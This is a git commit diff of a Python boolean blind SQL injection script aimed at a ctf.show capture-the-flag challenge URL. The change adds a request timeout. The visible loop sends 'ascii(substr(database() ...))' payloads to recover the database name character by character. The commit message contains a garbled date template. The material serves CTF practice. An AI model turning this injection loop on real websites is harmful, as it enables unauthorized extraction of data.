9291d8b40151c1a092beb2888e1c92d689092395
whb54012 <1226844928@qq.com>
2026-07-21 11:14:35 +0000

    自动提交：更新 ${2026/7/21 19:14ilenPM14e}

--- python/盲注脚本.py
+++ python/盲注脚本.py
@@ -4,7 +4,7 @@ url = "http://b14e78f6-4073-4fa1-ad67-8d5d1ed1deab.challenge.ctf.show/index.php?
 for num1 in range(1,20):
     for num2 in range (65,123):
         data = "ascii(substr(database() from %d for 1))=%d" % (num1, num2)
-        result = requests.get(url + data,verify=False)
+        result = requests.get(url + data,verify=False,timeout=1)
         if "IF" in result.text:
             word+=chr(num2)
             print(word)
